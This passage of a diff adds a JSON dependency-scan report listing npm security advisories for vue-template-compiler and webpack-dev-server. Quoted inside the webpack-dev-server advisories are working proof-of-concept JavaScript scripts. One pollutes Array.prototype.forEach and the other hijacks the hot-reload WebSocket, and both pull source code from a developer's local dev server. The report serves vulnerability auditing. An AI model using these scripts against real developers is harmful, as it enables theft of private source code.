+                "CVE-2024-6783",
+                "GHSA-g3ch-rx76-35fx"
+              ],
+              "max_severity": "4.2"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-g3ch-rx76-35fx/GHSA-g3ch-rx76-35fx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vue-template-compiler",
+                    "purl": "pkg:npm/vue-template-compiler"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "3.0.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-6783"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-07-23T16:26:53Z",
+                "nvd_published_at": "2024-07-23T15:15:06Z",
+                "severity": "MODERATE"
+              },
+              "details": "A vulnerability has been discovered in vue-template-compiler, that allows an attacker to perform XSS via prototype pollution. The attacker could change the prototype chain of some properties such as `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary JavaScript code. Vue 2 has reached End-of-Life. This vulnerability has been patched in Vue 3.",
+              "id": "GHSA-g3ch-rx76-35fx",
+              "modified": "2024-08-30T15:45:15Z",
+              "published": "2024-07-23T15:31:09Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-6783"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/vuejs/vue"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.herodevs.com/vulnerability-directory/cve-2024-6783"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "vue-template-compiler vulnerable to client-side Cross-Site Scripting (XSS)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "webpack-dev-server",
+            "version": "4.15.2",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4v9v-hfq4-rm2v"
+              ],
+              "aliases": [
+                "CVE-2025-30359",
+                "GHSA-4v9v-hfq4-rm2v"
+              ],
+              "max_severity": "5.3"
+            },
+            {
+              "ids": [
+                "GHSA-9jgg-88mc-972h"
+              ],
+              "aliases": [
+                "CVE-2025-30360",
+                "GHSA-9jgg-88mc-972h"
+              ],
+              "max_severity": "6.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 5.2.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-4v9v-hfq4-rm2v/GHSA-4v9v-hfq4-rm2v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "webpack-dev-server",
+                    "purl": "pkg:npm/webpack-dev-server"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.2.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-30359"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-749"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-04T21:09:13Z",
+                "nvd_published_at": "2025-06-03T18:15:25Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `\u003cscript src=\"http://localhost:8080/main.js\"\u003e` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) =\u003e {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) =\u003e {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () =\u003e {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n\u003cdetails\u003e\n\u003csummary\u003eOld content\u003c/summary\u003e\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `\u003cscript src=\"http://localhost:8080/main.js\"\u003e` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () =\u003e {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n\u003c/details\u003e",
+              "id": "GHSA-4v9v-hfq4-rm2v",
+              "modified": "2025-10-03T13:25:38Z",
+              "published": "2025-06-04T21:09:13Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30359"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/webpack/webpack-dev-server"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 5.2.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-9jgg-88mc-972h/GHSA-9jgg-88mc-972h.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "webpack-dev-server",
+                    "purl": "pkg:npm/webpack-dev-server"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "5.2.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-30360"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-346"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-06-04T21:09:38Z",
+                "nvd_published_at": "2025-06-03T18:15:25Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080\u0026file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) =\u003e {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event =\u003e {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
+              "id": "GHSA-9jgg-88mc-972h",
+              "modified": "2025-10-03T13:25:56Z",
+              "published": "2025-06-04T21:09:38Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30360"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/webpack/webpack-dev-server"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
